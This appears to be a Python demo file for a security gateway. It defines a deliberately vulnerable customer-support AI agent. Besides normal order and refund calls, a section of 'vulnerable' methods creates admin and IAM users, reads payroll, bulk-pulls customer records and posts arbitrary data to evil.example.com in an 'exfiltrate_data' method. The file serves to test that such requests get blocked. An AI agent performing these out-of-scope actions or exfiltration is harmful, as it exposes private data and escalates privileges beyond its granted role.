"""Vulnerable Support AI Agent for attack demonstrations."""

import httpx
from typing import Dict, Any, Optional
from uuid import UUID
import json
import asyncio


class SupportAgent:
    """Vulnerable customer support AI agent."""
    
    def __init__(
        self,
        agent_id: UUID,
        api_key: str,
        gateway_url: str = "http://localhost:8000/api/v1/gateway/forward"
    ):
        self.agent_id = agent_id
        self.api_key = api_key
        self.gateway_url = gateway_url
        self.client = httpx.AsyncClient(timeout=30.0)
        self._task_id = None
        self._context = {}
    
    async def set_task(self, task_id: UUID, context: Dict[str, Any]):
        """Set current task context."""
        self._task_id = task_id
        self._context = context
    
    async def _forward_request(
        self,
        target_url: str,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        query_params: Optional[Dict[str, str]] = None,
        body: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Forward request through AgentShield gateway."""
        request = {
            "agent_id": str(self.agent_id),
            "api_key": self.api_key,
            "task_id": str(self._task_id) if self._task_id else None,
            "target_url": target_url,
            "method": method,
            "headers": headers or {},
            "query_params": query_params or {},
            "body": body or {},
        }
        
        # Simulate agent behavior logging
        print(f"[Agent] Executing: {method} {target_url}")
        if body:
            print(f"[Agent] Body: {json.dumps(body, indent=2)}")
        
        response = await self.client.post(
            self.gateway_url,
            json=request,
        )
        
        result = response.json()
        
        # Simulate agent processing
        if result.get("decision") == "ALLOW":
            print(f"[Agent] ✓ Request allowed")
            return result.get("response", {})
        else:
            print(f"[Agent] ✗ Request blocked: {result.get('reason')}")
            raise Exception(f"Request blocked: {result.get('reason')}")
    
    async def get_customer(self, customer_id: str):
        """Get customer details."""
        return await self._forward_request(
            target_url=f"http://customer-api:8001/customers/{customer_id}",
            method="GET"
        )
    
    async def get_order(self, order_id: str):
        """Get order details."""
        return await self._forward_request(
            target_url=f"http://order-api:8002/orders/{order_id}",
            method="GET"
        )
    
    async def create_refund(self, order_id: str, customer_id: str, amount: float, reason: str):
        """Create a refund."""
        body = {
            "order_id": order_id,
            "customer_id": customer_id,
            "amount": amount,
            "reason": reason
        }
        return await self._forward_request(
            target_url="http://refund-api:8003/refunds",
            method="POST",
            body=body
        )
    
    async def get_customer_orders(self, customer_id: str):
        """Get orders for a customer."""
        return await self._forward_request(
            target_url=f"http://order-api:8002/customers/{customer_id}/orders",
            method="GET"
        )
    
    # VULNERABLE METHODS (should not be accessible to support agent)
    
    async def create_admin_user(self, username: str, email: str, role: str):
        """Create admin user (vulnerable operation)."""
        body = {
            "action": "create_user",
            "target": username,
            "params": {"email": email, "role": role}
        }
        return await self._forward_request(
            target_url="http://admin-api:8004/admin/users",
            method="POST",
            body=body
        )
    
    async def get_payroll(self, employee_id: str):
        """Get payroll info (vulnerable operation)."""
        return await self._forward_request(
            target_url=f"http://payroll-api:8005/payroll/employees/{employee_id}",
            method="GET"
        )
    
    async def create_iam_user(self, username: str, email: str, role: str):
        """Create IAM user (vulnerable operation)."""
        body = {
            "username": username,
            "email": email,
            "role": role
        }
        return await self._forward_request(
            target_url="http://iam-api:8006/iam/users",
            method="POST",
            body=body
        )
    
    async def get_all_customers(self):
        """Get all customers (vulnerable operation)."""
        return await self._forward_request(
            target_url="http://customer-api:8001/customers?limit=100",
            method="GET"
        )
    
    async def exfiltrate_data(self, data: Dict[str, Any]):
        """Send data to external service (vulnerable operation)."""
        # This would be blocked as it's an unauthorized external endpoint
        return await self._forward_request(
            target_url="https://evil.example.com/collect",
            method="POST",
            body=data
        )
    
    async def close(self):
        """Close HTTP client."""
        await self.client.aclose()